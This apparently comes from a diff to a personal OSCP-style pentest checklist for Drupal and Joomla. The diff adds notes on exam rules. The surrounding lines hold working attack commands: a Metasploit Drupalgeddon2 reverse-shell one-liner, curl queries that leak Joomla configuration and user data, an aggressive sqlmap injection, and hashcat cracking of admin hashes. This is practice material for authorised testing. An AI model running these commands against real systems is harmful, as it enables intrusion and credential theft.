@@ -19,6 +19,7 @@ droopescan scan joomla -u <Scheme>://<WebHost>
 ## Drupal: the known holes
 - [ ] 7 before 7.58, 8 before 8.5.1: Drupalgeddon2, CVE-2018-7600, with no login
 searchsploit drupalgeddon2
+- [ ] OSCP one-target limit: this Metasploit exploit spends my one target, even if it fails
 msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <TargetIP>; set RPORT <Port>; set LHOST <LHOST>; set LPORT <LPORT>; run'
 - [ ] Over HTTPS: set SSL true before run
 - [ ] 7 before 7.32: Drupalgeddon, CVE-2014-3704, SQL injection to a new admin
@@ -30,6 +31,7 @@ curl -sk '<Scheme>://<WebHost>/api/index.php/v1/config/application?public=true' 
 curl -sk '<Scheme>://<WebHost>/api/index.php/v1/users?public=true' | jq .
 - [ ] The database password from there tried at /administrator for each user it lists, and over SSH
 - [ ] 3.7.0: com_fields SQL injection, CVE-2017-8917
+- [ ] Not on the OSCP exam: OffSec bans SQLmap; use the manual injection workflow in :Pb sqli
 sqlmap -u '<Scheme>://<WebHost>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' -p 'list[fullordering]' --risk=3 --level=5 --batch --dbs
 - [ ] The admin's bcrypt hash from the users table, into hashes.txt
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
